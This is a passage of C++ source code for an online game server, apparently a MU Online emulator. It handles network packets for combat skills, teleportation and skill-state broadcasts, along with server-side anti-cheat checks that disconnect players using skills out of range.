	PHeadSetB((LPBYTE)&pResult, 0x18, sizeof(pResult));
	pResult.ActionNumber = lpMsg->ActionNumber;
	pResult.NumberH = SET_NUMBERH(aIndex);
	pResult.NumberL = SET_NUMBERL(aIndex);
	lpObj->m_ActionNumber = lpMsg->ActionNumber;
	lpObj->Dir = lpMsg->Dir;
	pResult.Dir = lpObj->Dir;
	pResult.TargetNumberH = lpMsg->iTargetIndexH;
	pResult.TargetNumberL = lpMsg->iTargetIndexL;

	if ( lpObj->m_ActionNumber == 0x80)
	{
		//lpObj->m_ViewState = 2;
		lpObj->m_Rest = lpObj->m_ActionNumber;
	}
	else if ( lpObj->m_ActionNumber == 0x81 )
	{
		//lpObj->m_ViewState = 3;
		lpObj->m_Rest = lpObj->m_ActionNumber;
	}
	else if ( lpObj->m_ActionNumber == 0x82 )
	{
		//lpObj->m_ViewState = 4;
		lpObj->m_Rest = lpObj->m_ActionNumber;
	}
	
	int MVL = MAX_VIEWPORT;

	if ( lpObj->Type == OBJ_MONSTER )
		MVL = MAX_VIEWPORT_MONSTER;

	for (int n=0;n<MVL;n++)
	{
		if ( lpObj->VpPlayer2[n].type == OBJ_USER )
		{
			if ( lpObj->VpPlayer2[n].state != 0 && lpObj->VpPlayer2[n].state != 0x10 && lpObj->VpPlayer2[n].state != 0x08)
			{
				DataSend(lpObj->VpPlayer2[n].number, (LPBYTE)&pResult, pResult.h.size);
			}
		}
	}
}



void CGRageAttack(unsigned char * Msg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	LPOBJ lpTargetObj;

	int usernumber = 0;
	int MagicNumber = 0;
	
	if(Msg[2] == 0x4B)
	{
		PMSG_RAGEATTACK* lpMsg = (PMSG_RAGEATTACK *) Msg;
	
		usernumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
		MagicNumber = MAKE_NUMBERW(lpMsg->MagicNumberH,lpMsg->MagicNumberL);
	}else
	{
		PMSG_RAGEATTACK_END* lpMsg = (PMSG_RAGEATTACK_END *) Msg;
	
		usernumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
		MagicNumber = MAKE_NUMBERW(lpMsg->MagicNumberH,lpMsg->MagicNumberL);
	}

	if ( usernumber < 0 || usernumber > OBJMAX-1 )
	{
		LogAdd("error :%s %d %d", __FILE__, __LINE__, usernumber);
		return;
	}

	if ( gObj[usernumber].Live == 0 || gObj[usernumber].Connected  < PLAYER_LOGGED )
		return;

	if ( gObj[aIndex].CloseCount >= 0 || gObj[usernumber].CloseCount >= 0 )
		return;

	if ( gObj[aIndex].m_bMapAntiHackMove == true || gObj[usernumber].m_bMapAntiHackMove == true )
		return;

	if ( gObj[aIndex].m_bMapSvrMoveQuit == true || gObj[usernumber].m_bMapSvrMoveQuit == true )
		return;

	CMagicInf * lpMagic;
	lpTargetObj = &gObj[usernumber];

	if ( lpTargetObj->Type == OBJ_USER )
	{
		if(lpTargetObj->Authority == 40 && lpTargetObj->AuthorityCode == 0x3F)
		{
			if(usernumber != aIndex)
				return;
		}
	}

	if ( lpObj->Type == OBJ_USER )
	{
		lpMagic = gObjGetMagicSearch(lpObj, MagicNumber);

		if ( !lpMagic )
			return;

		if ( MagicDamageC.SkillGetRequireClass(lpObj->Class, lpObj->ChangeUP, lpMagic->m_Skill) < 1 )
			return;

		if ( MagicDamageC.CheckStatus(lpMagic->m_Skill, lpObj->GuildStatus) == 0 )
		{
			LogAddC(2, "CGRageAttack() - Invalid Status");
			return;
		}

		if ( MagicDamageC.CheckKillCount(lpMagic->m_Skill, lpObj->m_btKillCount) < 0 )
		{
			LogAddC(2, "CGRageAttack() - Invalid KillCount");
			return;
		}
	}

	if ( !gCheckSkillDistance(aIndex, usernumber, lpMagic->m_Skill))
	{
		DWORD dwTick = GetTickCount() - lpObj->m_dwSkillDistanceErrorTick;
		
		if ( dwTick > (g_iSkillDiatanceKickCheckTime*1000) )
		{
			lpObj->m_iSkillDistanceErrorCount = 0;
			lpObj->m_dwSkillDistanceErrorTick = GetTickCount();
		}

		lpObj->m_iSkillDistanceErrorCount++;

		if ( lpObj->m_iSkillDistanceErrorCount > g_iSkillDistanceKickCount )
		{
			if ( g_iSkillDistanceKick )
			{
				if(ReadConfig.AHLog == TRUE)
				{
					ANTI_HACK_LOG.Output("[SKILL DISTANCE CHECK] [%s][%s] Kick Invalid Skill Area User. count(%d)",
						lpObj->AccountID, lpObj->Name, lpObj->m_iSkillDistanceErrorCount);
				}
				GCServerMsgStringSend("[Anti-Hack] Kick Invalid Skill Area User.",lpObj->m_Index, 0x01);

				CloseClient(lpObj->m_Index);
				return;
			}

			lpObj->m_iSkillDistanceErrorCount=0;
		}

		return;
	}

	if(MagicNumber == AT_SKILL_DARKSIDE)
	{
		if(Msg[2] == 0x4B)
		{
			gObjUseSkill.SkillDarkSideStart(aIndex, usernumber, lpMagic);
		}
		else if(Msg[2] == 0x4A)
		{
			gObjUseSkill.SkillDarkSideEnd(aIndex, usernumber, lpMagic);
		}
	}	
	lpObj->MovePerSecs++;
}


void CGMagicAttack(unsigned char * Msg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj;
	LPOBJ lpTargetObj;

	int usernumber = 0;
	int MagicNumber = 0;
	
	bool IsS5E2 = false;
	if(ReadConfig.IsEngProtocol == 0)
	{
		IsS5E2 = true;
	}else
	{
		if(Msg[0] != 0xC1)
			IsS5E2 = true;
	}
	if(ReadConfig.S5E2 == TRUE && IsS5E2 == true)
	//if(ReadConfig.S5E2 == TRUE && ReadConfig.IsEngProtocol == 0)
	{
		PMSG_MAGICATTACK_S5E2* lpMsg = (PMSG_MAGICATTACK_S5E2 *) Msg;
		if(lpMsg->MagicNumberH == 0xCC)
			lpMsg->MagicNumberH = 0;
		usernumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
		MagicNumber = MAKE_NUMBERW(lpMsg->MagicNumberH,lpMsg->MagicNumberL);

		Mastering2.BaseSkill(MagicNumber);
	}else
	{
		PMSG_MAGICATTACK* lpMsg = (PMSG_MAGICATTACK *) Msg;
		if(lpMsg->MagicNumberH == 0xCC)
			lpMsg->MagicNumberH = 0;
		usernumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
		MagicNumber = MAKE_NUMBERW(lpMsg->MagicNumberH,lpMsg->MagicNumberL);

		Mastering2.BaseSkill(MagicNumber);
	}
	
	if ( usernumber < 0 || usernumber > OBJMAX-1 )
	{
		LogAdd("error :%s %d %d", __FILE__, __LINE__, usernumber);
		return;
	}

	if ( gObj[usernumber].Live == 0 || gObj[usernumber].Connected  < PLAYER_LOGGED )
		return;

	if ( gObj[aIndex].CloseCount >= 0 || gObj[usernumber].CloseCount >= 0 )
		return;

	if ( gObj[aIndex].m_bMapSvrMoveQuit == true || gObj[usernumber].m_bMapSvrMoveQuit == true )
		return;

	if ( gObj[aIndex].m_bMapAntiHackMove == true || gObj[usernumber].m_bMapAntiHackMove == true )
		return;

	lpObj = &gObj[aIndex];
	lpTargetObj = &gObj[usernumber];
	
	CMagicInf * lpMagic;

	/*if(lpTargetObj->Class == 277 && g_CastleSiegeSync.GetCastleState() == CASTLESIEGE_STATE_STARTSIEGE)		//Castle Gate
	{
		//Do nothing
	}
	else if(lpTargetObj->Class == 283 && g_CastleSiegeSync.GetCastleState() == CASTLESIEGE_STATE_STARTSIEGE)	//Guardian Statue
	{
		//Do nothing
	}
	else
	{
		if ( gclassObjAttack.CheckAttackArea(lpObj,lpTargetObj) == FALSE )
		{
			if ( lpObj->Class == 275 )		// Kundun
				lpObj->TargetNumber = -1;

			return;
		}
	}*/

	if ( lpTargetObj->Type == OBJ_USER )
	{
		if(lpTargetObj->Authority == 40 && lpTargetObj->AuthorityCode == 0x3F)
		{
			if(usernumber != aIndex)
				return;
		}
	}

	if ( lpObj->Type == OBJ_USER )
	{
		lpMagic = gObjGetMagicSearch(lpObj, MagicNumber);

		if ( !lpMagic )
			return;

		if ( MagicDamageC.SkillGetRequireClass(lpObj->Class, lpObj->ChangeUP, lpMagic->m_Skill) < 1 )
			return;

		if ( MagicDamageC.CheckStatus(lpMagic->m_Skill, lpObj->GuildStatus) == 0 )
		{
			LogAddC(2, "[0x19] CGMagicAttack() - Invalid Status");
			return;
		}

		if ( MagicDamageC.CheckKillCount(lpMagic->m_Skill, lpObj->m_btKillCount) < 0 )
		{
			LogAddC(2, "[0x19] CGMagicAttack() - Invalid KillCount");
			return;
		}
	}
#if (PACK_EDITION>=3)
	else if(lpObj->IsBot == 1)
	{
		lpMagic = gObjGetMagicSearch(lpObj, lpObj->m_SkillNumber);

		if ( !lpMagic )
			return;

		if ( MagicDamageC.SkillGetRequireClass(lpObj->Class, lpObj->ChangeUP, lpMagic->m_Skill) < 1 )
			return;

		if ( MagicDamageC.CheckStatus(lpMagic->m_Skill, lpObj->GuildStatus) == 0 )
		{
			LogAddC(2, "[0x19] CGMagicAttack() - Invalid Status");
			return;
		}

		if ( MagicDamageC.CheckKillCount(lpMagic->m_Skill, lpObj->m_btKillCount) < 0 )
		{
			LogAddC(2, "[0x19] CGMagicAttack() - Invalid KillCount");
			return;
		}
	}
#endif
	else
	{
		lpMagic = gObjGetMagic(lpObj, MagicNumber);

		if ( !lpMagic )
			return;
	}

	if ((lpMagic->m_Skill != 24) && 
		(lpMagic->m_Skill != 235) && 
		(lpMagic->m_Skill != 490) && 
		(lpMagic->m_Skill != 491) && 
		(lpMagic->m_Skill != 492) && 
		(lpMagic->m_Skill != 493) && 
		(lpMagic->m_Skill != 494))
	{
		if ( !gObjUseSkill.SpeedHackCheck(lpObj->m_Index,1) )
			return;
	}

	if ( !gCheckSkillDistance(aIndex, usernumber, lpMagic->m_Skill))
	{
		DWORD dwTick = GetTickCount() - lpObj->m_dwSkillDistanceErrorTick;
		
		if ( dwTick > (g_iSkillDiatanceKickCheckTime*1000) )
		{
			lpObj->m_iSkillDistanceErrorCount = 0;
			lpObj->m_dwSkillDistanceErrorTick = GetTickCount();
		}

		lpObj->m_iSkillDistanceErrorCount++;

		if ( lpObj->m_iSkillDistanceErrorCount > g_iSkillDistanceKickCount )
		{
			if ( g_iSkillDistanceKick )
			{
				if(ReadConfig.AHLog == TRUE)
				{
					ANTI_HACK_LOG.Output("[SKILL DISTANCE CHECK] [%s][%s] Kick Invalid Skill Area User. count(%d)",
						lpObj->AccountID, lpObj->Name, lpObj->m_iSkillDistanceErrorCount);
				}
				GCServerMsgStringSend("[Anti-Hack] Kick Invalid Skill Area User.",lpObj->m_Index, 0x01);

				CloseClient(lpObj->m_Index);
				return;
			}

			lpObj->m_iSkillDistanceErrorCount=0;
		}

		return;
	}
	lpObj->MovePerSecs++;
	gObjUseSkill.UseSkill(aIndex, usernumber, lpMagic);
}




void  GCMagicAttackNumberSend(LPOBJ lpObj, WORD MagicNumber, int usernumber,  unsigned char skillsuccess)
{
	//bool IsS5E2 = false;
	//if(ReadConfig.IsEngProtocol == 0)
	//{
	//	IsS5E2 = true;
	//}else
	//{
	//	if(Msg[0] != 0xC1)
	//		IsS5E2 = true;
	//}
	//if(ReadConfig.S5E2 == TRUE && IsS5E2 == true)
	if(ReadConfig.S5E2 == TRUE)// && ReadConfig.IsEngProtocol == 0)
	{
		PMSG_MAGICATTACK_RESULT_S5E2 pAttack;
		
		PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof(pAttack));
		//pAttack.MagicNumber = MagicNumber;
		pAttack.MagicNumberH = SET_NUMBERH(MagicNumber);
		pAttack.MagicNumberL = SET_NUMBERL(MagicNumber);
		pAttack.SourceNumberH = SET_NUMBERH(lpObj->m_Index);
		pAttack.SourceNumberL = SET_NUMBERL(lpObj->m_Index);
		pAttack.TargetNumberH = SET_NUMBERH(usernumber);
		pAttack.TargetNumberL = SET_NUMBERL(usernumber);
		pAttack.TargetNumberH &= 0x7F;
		pAttack.UnkS5E2 = 1;
		//pAttack.UNK1 = 0x00;

		if ( skillsuccess )
			pAttack.TargetNumberH |= 0x80;

		if ( lpObj->Type == OBJ_USER )
			DataSend(lpObj->m_Index, (LPBYTE)&pAttack, pAttack.h.size);

		if ( CC_MAP_RANGE(lpObj->MapNumber) )
		{
			switch ( MagicNumber )
			{
				case 16:
				case 26:
				case 27:
				case 28:
				case 48:
					return;
			}
		}
		
		MsgSendV2(lpObj, (LPBYTE)&pAttack, pAttack.h.size);
	}
	else
	{
		PMSG_MAGICATTACK_RESULT pAttack;
		
		PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof(pAttack));
		//pAttack.MagicNumber = MagicNumber;
		pAttack.MagicNumberH = SET_NUMBERH(MagicNumber);
		pAttack.MagicNumberL = SET_NUMBERL(MagicNumber);
		pAttack.SourceNumberH = SET_NUMBERH(lpObj->m_Index);
		pAttack.SourceNumberL = SET_NUMBERL(lpObj->m_Index);
		pAttack.TargetNumberH = SET_NUMBERH(usernumber);
		pAttack.TargetNumberL = SET_NUMBERL(usernumber);
		pAttack.TargetNumberH &= 0x7F;
		//pAttack.UNK1 = 0x00;

		if ( skillsuccess )
			pAttack.TargetNumberH |= 0x80;

		if ( lpObj->Type == OBJ_USER )
			DataSend(lpObj->m_Index, (LPBYTE)&pAttack, pAttack.h.size);

		if ( CC_MAP_RANGE(lpObj->MapNumber) )
		{
			switch ( MagicNumber )
			{
				case 16:
				case 26:
				case 27:
				case 28:
				case 48:
					return;
			}
		}
		
		MsgSendV2(lpObj, (LPBYTE)&pAttack, pAttack.h.size);
	}
}





void GCMagicCancelSend(LPOBJ lpObj, BYTE MagicNumber)
{
	PMSG_MAGICCANCEL pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x1B, sizeof(pMsg));
	pMsg.MagicNumber = MagicNumber;
	pMsg.NumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.NumberL = SET_NUMBERL(lpObj->m_Index);

	if ( lpObj->Type == OBJ_USER )
		DataSend(lpObj->m_Index, (UCHAR*)&pMsg, pMsg.h.size);
	
	MsgSendV2(lpObj, (UCHAR*)&pMsg, pMsg.h.size);
}



struct PMSG_USEEFFECTITEM
{
	PBMSG_HEAD h;	// C1:2D
	WORD wOptionType;	// 4
	WORD wEffectType;	// 6
	BYTE byEffectOption;	// 8
	int iLeftTime;	// C
};


void GCUseEffectItem(LPOBJ lpObj, int iEffectUseOption, int iOptionType, int iEffectType, int iLeftTime)
{
	PMSG_USEEFFECTITEM pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x2D, sizeof(pMsg));
	pMsg.byEffectOption = iEffectUseOption;
	pMsg.wOptionType = iOptionType;
	pMsg.wEffectType = iEffectType;
	pMsg.iLeftTime = iLeftTime;

	if ( lpObj->Type == OBJ_USER )
		DataSend(lpObj->m_Index, (UCHAR*)&pMsg, pMsg.h.size);
}

void CGMagicCancel(PMSG_MAGICCANCEL * lpMsg, int aIndex)
{
	if ( !OBJMAX_RANGE(aIndex))
		return;

	LPOBJ lpObj = &gObj[aIndex];


	if ( lpMsg->MagicNumber == 77 )
	{
		if ( lpObj->m_iMuseElfInfinityArrowSkillTime > 0 )
		{
			lpObj->m_iMuseElfInfinityArrowSkillTime = 0;
			lpObj->m_ViewSkillState &= ~1024;
			GCSkillInfoSend(lpObj, 0, 0x06);
		}
	}
}


struct PMSG_USE_MONSTERSKILL
{
	PBMSG_HEAD h;	// C1:69

	BYTE btPadding1;
	BYTE btMonsterSkillNumber;	// 3 was
	BYTE btPadding2;

	WORD wObjIndex;	// 4
	WORD wTargetObjIndex;	// 6
};


void GCUseMonsterSkillSend(LPOBJ lpObj, LPOBJ lpTargetObj, int iSkillNumber)
{	
	PMSG_USE_MONSTERSKILL pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x69, sizeof(pMsg));

	pMsg.btPadding1=0x00;
	pMsg.btPadding2=0x00;
	pMsg.btMonsterSkillNumber = iSkillNumber;
	pMsg.wObjIndex = lpObj->m_Index;
	pMsg.wTargetObjIndex = lpTargetObj->m_Index;

/*	pMsg.MagicNumberL = SET_NUMBERL(iSkillNumber);
	pMsg.MagicNumberH = SET_NUMBERH(iSkillNumber);
	pMsg.SourceNumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.SourceNumberL = SET_NUMBERL(lpObj->m_Index);
	pMsg.TargetNumberH = SET_NUMBERH(lpTargetObj->m_Index);
	pMsg.TargetNumberL = SET_NUMBERL(lpTargetObj->m_Index);*/

	if ( lpObj->Type == OBJ_USER )
		DataSend(lpObj->m_Index, (UCHAR*)&pMsg, pMsg.h.size);

	MsgSendV2(lpObj, (UCHAR*)&pMsg, pMsg.h.size);
}
	

struct PMSG_VIEWSKILLSTATE
{
	PBMSG_HEAD h;	// C1:07
	BYTE State;		// 3
	BYTE NumberH;	// 8
	BYTE NumberL;	// 9
	BYTE UNK1;
};

void GCSantaStateInfoSend(LPOBJ lpObj, BYTE state)
{
	int ViewSkillState = 0;
	switch(lpObj->m_iSkillNPCSantaType)
	{
		case 465://Santa Claus: Blessing Buff
		case 476://Evil Santa: Blessing Buff
		{
			ViewSkillState = 91;
		}break;
		case 474://orange
		{
			ViewSkillState = 92;
		}break;
		case 471://blue
		{
			ViewSkillState = 93;
		}break;
		case 470://red
		{
			ViewSkillState = 94;
		}break;
		case 469://green
		{
			ViewSkillState = 95;
		}break;
		case 475://pink
		{
			ViewSkillState = 96;
		}break;
		case 468://yellow(purple)
		{
			ViewSkillState = 97;
		}break;
	}
	PMSG_VIEWSKILLSTATE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x07, sizeof(pMsg));
	pMsg.State = state;
	pMsg.NumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.NumberL = SET_NUMBERL(lpObj->m_Index);
	pMsg.UNK1 = ViewSkillState;

	if ( lpObj->Type == OBJ_USER )
		DataSend(lpObj->m_Index, (UCHAR*)&pMsg, pMsg.h.size);

	MsgSendV2(lpObj, (UCHAR*)&pMsg, pMsg.h.size);
}


void GCSkillInfoSend(LPOBJ lpObj, BYTE state, int  ViewSkillState)
{
	PMSG_VIEWSKILLSTATE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x07, sizeof(pMsg));
	pMsg.State = state;
	pMsg.NumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.NumberL = SET_NUMBERL(lpObj->m_Index);
	pMsg.UNK1 = ViewSkillState;

	//if ( lpObj->Type == OBJ_USER )
	//	DataSend(lpObj->m_Index, (UCHAR*)&pMsg, pMsg.h.size);

	MsgSendDistNear(lpObj, (UCHAR*)&pMsg, pMsg.h.size, 16);
	//MsgSendV2(lpObj, (UCHAR*)&pMsg, pMsg.h.size);
}


struct PMSG_TELEPORT_RESULT
{
	PBMSG_HEAD h;	// C3:1C
	BYTE UNK0; //S4 IcaruS FIX
	BYTE UNK1; //3
	BYTE MoveNumber;	// 4
	BYTE MapNumber;	// 5
	BYTE MapX;	// 6
	BYTE MapY;	// 7
	BYTE Dir;	// 8
};

void CGMWindowRecv(PMSG_MWINDOW* lpMsg, int aIndex)
{

	if ( !OBJMAX_RANGE(aIndex))
		return;

	if ( gObj[aIndex].m_iSkillStunTime > 0 )
		return;

	if ( gObj[aIndex].m_PK_Level >= 5 )
	{
		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 101)), aIndex, 1);
		return;
	}

	if ( lpMsg->MoveNumber != 0 )
	{
		gMoveCommand.Move(&gObj[aIndex], lpMsg->MoveNumber);
	}
}

void CGTeleportRecv(PMSG_TELEPORT* lpMsg, int aIndex)
{
	//lpMsg->Unk=0;
	if ( !OBJMAX_RANGE(aIndex))
		return;

	if ( gObj[aIndex].m_iSkillStunTime > 0 )
		return;

	if ( lpMsg->MoveNumber == 0 )
	{
		if(ReadConfig.S5E2 == TRUE)
		{
			CMagicInf * lpMagic;
			BYTE x;
			BYTE y;
			PMSG_MAGICATTACK_RESULT_S5E2 pAttack;

			PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof(pAttack));
			//pAttack.MagicNumber = 6;
			pAttack.MagicNumberH = 0;
			pAttack.MagicNumberL = 6;
			pAttack.SourceNumberH = SET_NUMBERH(aIndex);
			pAttack.SourceNumberL = SET_NUMBERL(aIndex);
			pAttack.TargetNumberH = SET_NUMBERH(aIndex);
			pAttack.TargetNumberL = SET_NUMBERL(aIndex);
			pAttack.UnkS5E2 = 1;

			lpMagic = gObjGetMagicSearch(&gObj[aIndex], AT_SKILL_TELEPORT);
			x = lpMsg->MapX;
			y = lpMsg->MapY;

			if ( gObjCheckTeleportArea(aIndex, x, y) == FALSE )
			{
				LogAddC(2, "[%s][%s] Try Teleport Not Move Area [%d,%d]",
					gObj[aIndex].AccountID, gObj[aIndex].Name,
					x, y);

				PMSG_TELEPORT_RESULT pTeleportResult;

				pTeleportResult.h.c = 0xC3;
				pTeleportResult.h.size = sizeof(pTeleportResult);
				pTeleportResult.h.headcode = 0x1C;
				pTeleportResult.MoveNumber = 0;
				pTeleportResult.MapNumber = gObj[aIndex].MapNumber;
				pTeleportResult.MapX = gObj[aIndex].X;
				pTeleportResult.MapY = gObj[aIndex].Y;
				pTeleportResult.Dir = gObj[aIndex].Dir;
				pTeleportResult.UNK1 = 0x00;

				DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);
				return;
			}

			#if (GS_CASTLE==1)
			//Castle Siege State Send Fix [1]
			/*if ( gObj[aIndex].MapNumber == MAP_INDEX_CASTLESIEGE )
			{
				//CheckTeleportMagicAxisY(int iStartY, int iTargetX, int iTargetY)
				if ( !sub_406947(*(_WORD *)(6524 * a2 + Y), (unsigned __int8)v19, (unsigned __int8)v20) )
					LOBYTE(v20) = *(_BYTE *)(6524 * a2 + Y);
			}*/
			#endif

			if ( lpMagic )
			{
				//int usemana = gObjMagicManaUse(&gObj[aIndex], lpMagic);
				int usemana = gObjUseSkill.GetUseMana(aIndex,lpMagic);

				if ( usemana >= 0 )
				{
					//int usebp = gObjMagicBPUse(&gObj[aIndex], lpMagic);
					int usebp = gObjUseSkill.GetUseBP(aIndex,lpMagic);

					if ( usebp >= 0 )
					{
						pAttack.MagicNumberH = 0;
						//pAttack.UNK1 = 0;
						if ( gObj[aIndex].Type == OBJ_USER )
							DataSend(aIndex, (LPBYTE)&pAttack, pAttack.h.size);

						MsgSendV2(&gObj[aIndex], (LPBYTE)&pAttack, pAttack.h.size);
						gObjTeleportMagicUse(aIndex, x, y);
						//gObj[aIndex].Mana = usemana;
						//gObj[aIndex].BP = usebp;
						gObj[aIndex].Mana -= usemana;
						gObj[aIndex].BP -= usebp;
						GCManaSend(gObj[aIndex].m_Index, gObj[aIndex].Mana, -1, 0, gObj[aIndex].BP);
					}
				}
			}
		}else
		{
			CMagicInf * lpMagic;
			BYTE x;
			BYTE y;
			PMSG_MAGICATTACK_RESULT pAttack;

			PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof(pAttack));
			//pAttack.MagicNumber = 6;
			pAttack.MagicNumberH = 0;
			pAttack.MagicNumberL = 6;
			pAttack.SourceNumberH = SET_NUMBERH(aIndex);
			pAttack.SourceNumberL = SET_NUMBERL(aIndex);
			pAttack.TargetNumberH = SET_NUMBERH(aIndex);
			pAttack.TargetNumberL = SET_NUMBERL(aIndex);

			lpMagic = gObjGetMagicSearch(&gObj[aIndex], AT_SKILL_TELEPORT);
			x = lpMsg->MapX;
			y = lpMsg->MapY;

			if ( gObjCheckTeleportArea(aIndex, x, y) == FALSE )
			{
				LogAddC(2, "[%s][%s] Try Teleport Not Move Area [%d,%d]",
					gObj[aIndex].AccountID, gObj[aIndex].Name,
					x, y);

				PMSG_TELEPORT_RESULT pTeleportResult;

				pTeleportResult.h.c = 0xC3;
				pTeleportResult.h.size = sizeof(pTeleportResult);
				pTeleportResult.h.headcode = 0x1C;
				pTeleportResult.MoveNumber = 0;
				pTeleportResult.MapNumber = gObj[aIndex].MapNumber;
				pTeleportResult.MapX = gObj[aIndex].X;
				pTeleportResult.MapY = gObj[aIndex].Y;
				pTeleportResult.Dir = gObj[aIndex].Dir;
				pTeleportResult.UNK1 = 0x00;

				DataSend(aIndex, (LPBYTE)&pTeleportResult, pTeleportResult.h.size);
				return;
			}

			#if (GS_CASTLE==1)
			//Castle Siege State Send Fix [1]
			/*if ( gObj[aIndex].MapNumber == MAP_INDEX_CASTLESIEGE )
			{
				//CheckTeleportMagicAxisY(int iStartY, int iTargetX, int iTargetY)
				if ( !sub_406947(*(_WORD *)(6524 * a2 + Y), (unsigned __int8)v19, (unsigned __int8)v20) )
					LOBYTE(v20) = *(_BYTE *)(6524 * a2 + Y);
			}*/
			#endif

			if ( lpMagic )
			{
				//int usemana = gObjMagicManaUse(&gObj[aIndex], lpMagic);
				int usemana = gObjUseSkill.GetUseMana(aIndex,lpMagic);

				if ( usemana >= 0 )
				{
					//int usebp = gObjMagicBPUse(&gObj[aIndex], lpMagic);
					int usebp = gObjUseSkill.GetUseBP(aIndex,lpMagic);

					if ( usebp >= 0 )
					{
						pAttack.MagicNumberH = 0;
						//pAttack.UNK1 = 0;
						if ( gObj[aIndex].Type == OBJ_USER )
							DataSend(aIndex, (LPBYTE)&pAttack, pAttack.h.size);

						MsgSendV2(&gObj[aIndex], (LPBYTE)&pAttack, pAttack.h.size);
						gObjTeleportMagicUse(aIndex, x, y);
						gObj[aIndex].Mana -= usemana;
						gObj[aIndex].BP -= usebp;
						GCManaSend(gObj[aIndex].m_Index, gObj[aIndex].Mana, -1, 0, gObj[aIndex].BP);
					}
				}
			}
		}
	}
	else if ( gGateC.IsInGate(aIndex, lpMsg->MoveNumber) )
	{
		gObjMoveGate(aIndex, lpMsg->MoveNumber);
	}
	else
	{
		gObjClearViewport(&gObj[aIndex]);
		GCTeleportSend(&gObj[aIndex], lpMsg->MoveNumber, 
			gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, gObj[aIndex].Dir);

		#if (GS_CASTLE==1)
		//Castle Siege State Send Fix [2]
		if ( gObj[aIndex].MapNumber == MAP_INDEX_CASTLESIEGE )
		{
			if ( g_CastleSiege.GetCastleState() == 7 )
			{
				GCAnsCsNotifyStart(aIndex, 1);
				g_CastleSiege.NotifySelfCsJoinSide(aIndex);
				g_CastleSiege.NotifyCsSelfLeftTime(aIndex);
			} else {
				GCAnsCsNotifyStart(aIndex, 0);
			}
		}
		#endif

		if ( gObj[aIndex].MapNumber == MAP_INDEX_CRYWOLF_FIRSTZONE )
		{
			g_CrywolfSync.NotifyCrywolfCurrentStateByUserId(aIndex);
		}
	}
}




void CGTargetTeleportRecv(PMSG_TARGET_TELEPORT * lpMsg, int aIndex)
{
	if ( !OBJMAX_RANGE(aIndex))
		return;

	if ( gObj[aIndex].m_iSkillStunTime > 0 )
		return;

	CMagicInf * lpMagic;
	BYTE x;
	BYTE y;
	if(ReadConfig.S5E2 == TRUE)
	{
		PMSG_MAGICATTACK_RESULT_S5E2 pAttack;

		PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof(pAttack));
		//pAttack.MagicNumber = AT_SKILL_TARGET_TELEPORT;
		pAttack.UnkS5E2 = 1;
		pAttack.MagicNumberH = 0;
		pAttack.MagicNumberL = AT_SKILL_TARGET_TELEPORT;;
		pAttack.SourceNumberH = SET_NUMBERH(aIndex);
		pAttack.SourceNumberL = SET_NUMBERL(aIndex);
		int iTargetIndex = MAKE_NUMBERW(lpMsg->NumberL, lpMsg->NumberH);	// #error? parameters inverse?
		pAttack.TargetNumberH = SET_NUMBERH(iTargetIndex);	// #error? parameters inverse?
		pAttack.TargetNumberL = SET_NUMBERL(iTargetIndex);	// #error? parameters inverse?
		lpMagic = gObjGetMagicSearch(&gObj[aIndex], AT_SKILL_TARGET_TELEPORT);
		x = lpMsg->MapX;
		y = lpMsg->MapY;

		if ( !gObjIsConnectedGP(iTargetIndex) )
		{
			LogAddC(2, "[%s][%s] Try Target Teleport Not Move Area [%d,%d]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, x, y);

			return;
		}

		if ( gObj[aIndex].PartyNumber != gObj[iTargetIndex].PartyNumber ||
			 gObj[aIndex].PartyNumber == -1 ||
			 gObj[iTargetIndex].PartyNumber == -1)
		{
			return;
		}

		if ( !gObjCheckTeleportArea(iTargetIndex, x, y))
		{
			LogAddC(2, "[%s][%s] Try Target Teleport Not Move Area [%d,%d]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, x, y);

			return;
		}

		if ( lpMagic )
		{
			//int usemana = gObjMagicManaUse(&gObj[aIndex], lpMagic);
			int usemana = gObjUseSkill.GetUseMana(aIndex,lpMagic);

			if ( usemana >= 0 )
			{
				//int usebp = gObjMagicBPUse(&gObj[aIndex], lpMagic);
				int usebp = gObjUseSkill.GetUseBP(aIndex,lpMagic);

				if ( usebp >= 0 )
				{
					if ( gObj[aIndex].Type == OBJ_USER )
						DataSend(aIndex, (LPBYTE)&pAttack, pAttack.h.size);

					MsgSendV2(&gObj[aIndex], (LPBYTE)&pAttack, pAttack.h.size);
					gObjTeleportMagicUse(iTargetIndex, x, y);
					gObj[aIndex].Mana -= usemana;
					gObj[aIndex].BP -= usebp;
					GCManaSend(gObj[aIndex].m_Index, gObj[aIndex].Mana, -1, 0, gObj[aIndex].BP);

					return;
				}
			}
		}
	}else
	{
		PMSG_MAGICATTACK_RESULT pAttack;

		PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof(pAttack));
		//pAttack.MagicNumber = AT_SKILL_TARGET_TELEPORT;
		pAttack.MagicNumberH = 0;
		pAttack.MagicNumberL = AT_SKILL_TARGET_TELEPORT;;
		pAttack.SourceNumberH = SET_NUMBERH(aIndex);
